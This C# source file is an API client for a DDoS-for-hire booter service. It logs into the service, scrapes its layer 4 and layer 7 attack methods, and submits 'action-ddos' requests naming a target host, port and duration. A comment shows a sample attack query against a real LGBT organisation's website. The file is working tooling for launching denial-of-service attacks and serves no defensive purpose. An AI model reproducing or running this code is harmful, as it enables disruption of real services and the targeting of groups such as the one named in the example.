using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Web;
using HtmlAgilityPack;

namespace ts3booter.MainAPI
{
    public class Ts3Booter
    {
        public string user, pass;
        private string phpsessionid;
        private bool logged_in = false;
        public Ts3Booter(string username, string password)
        {
            user = username;
            pass = password;
        }

        public bool Login()
        {
            string content;
            HttpWebRequest webRequest = (HttpWebRequest)WebRequest.Create("https://ts3booter.net/login");
            webRequest.CookieContainer = new CookieContainer();
            webRequest.Method = "POST";
            webRequest.ContentType = "application/x-www-form-urlencoded";
            pass = HttpUtility.UrlEncode(pass);
            string login_query = "username=" + HttpUtility.UrlEncode(user) + "&password=" + pass + "&g-recaptcha-response=&action-login=";
            using (StreamWriter sw = new StreamWriter(webRequest.GetRequestStream()))
            {
                sw.WriteLine(login_query);
            }
            HttpWebResponse httpResponse = (HttpWebResponse)webRequest.GetResponse();
            using (StreamReader sr = new StreamReader(httpResponse.GetResponseStream()))
            {
                content = sr.ReadToEnd();
            }
            if (content != null && content.Contains("icon fas fa-check-circle"))
            {
                logged_in = true;
                phpsessionid = httpResponse.Cookies[0].Value;
                return true;
            }
            else if (content != null && content.Contains("icon fa fa-ban"))
            {
                return false;
            }
            else
            {
                return false;
            }
        }

        public string[] GetMethods(int layer = 4)
        {
            if (logged_in == false)
            {
                return null;
            }
            var get_methods_request = (HttpWebRequest)WebRequest.Create("https://ts3booter.net/home");
            if (layer == 4)
            {
                CookieContainer cookie = new CookieContainer();
                cookie.Add(new Cookie("PHPSESSID", phpsessionid) { Domain = "ts3booter.net" });
                get_methods_request.CookieContainer = cookie;
                HttpWebResponse html_raw = (HttpWebResponse)get_methods_request.GetResponse();
                using (StreamReader reader = new StreamReader(html_raw.GetResponseStream()))
                {
                    List<string> methods = new List<string>();
                    HtmlDocument document = new HtmlDocument();
                    document.LoadHtml(reader.ReadToEnd());
                    var nodes = document.DocumentNode.SelectNodes("/html/body/div[1]/div[@id='page-content-wrapper']/div[1]/div[1]/div[1]/div[1]/div[@class='card-body bg-gray']/form/div[4]/select/option");
                    foreach (var node in nodes)
                    {
                        methods.Add(node.Attributes["value"].Value);
                    }
                    return methods.ToArray();
                }
            } else if (layer == 7)
            {
                CookieContainer cookie = new CookieContainer();
                cookie.Add(new Cookie("PHPSESSID", phpsessionid) { Domain = "ts3booter.net" });
                get_methods_request.CookieContainer = cookie;
                HttpWebResponse html_raw = (HttpWebResponse)get_methods_request.GetResponse();
                using (StreamReader reader = new StreamReader(html_raw.GetResponseStream()))
                {
                    List<string> methods = new List<string>();
                    HtmlDocument document = new HtmlDocument();
                    document.LoadHtml(reader.ReadToEnd());
                    var nodes = document.DocumentNode.SelectNodes("/html/body/div/div[@id='page-content-wrapper']/div[1]/div[1]/div[2]/div[1]/div[@class='card-body bg-gray']/form/div[4]/select/option");
                    foreach (var node in nodes)
                    {
                        methods.Add(node.Attributes["value"].Value);
                    }
                    return methods.ToArray();
                }
            } else
            {
                return null;
            }
        }
        public bool StartLayer4(string host, string method, int port = 80, int time = 60)
        {
            if (logged_in == false)
            {
                return false;
            }
            var layer4 = (HttpWebRequest)WebRequest.Create("https://ts3booter.net/home");
            CookieContainer cookie = new CookieContainer();
            cookie.Add(new Cookie("PHPSESSID", phpsessionid) { Domain = "ts3booter.net" });
            layer4.CookieContainer = cookie;
            layer4.Method = "POST";
            string attack_query = "host%5B%5D=" + HttpUtility.UrlEncode(host) + "&port=" + HttpUtility.UrlEncode(port.ToString()) + "&time=" + HttpUtility.UrlEncode(time.ToString()) + "&method=" + method + "&action-ddos=";
            layer4.ContentType = "application/x-www-form-urlencoded";
            using (StreamWriter sw = new StreamWriter(layer4.GetRequestStream()))
            {
                sw.WriteLine(attack_query);
            }
            HttpWebResponse status = (HttpWebResponse)layer4.GetResponse();
            using (StreamReader reader = new StreamReader (status.GetResponseStream()))
            {
                string response = reader.ReadToEnd();
                if (response.Contains("icon fa fa-ban"))
                {
                    return false;
                } else if (response.Contains("icon fas fa-check-circle"))
                {
                    return true;
                } else
                {
                    return false;
                }
            }
            // host%5B%5D=https%3A%2F%2Flgbt.foundation%2F&port=443&time=60&method=HTTP-LOAD&action-ddos=
        }

    }
}
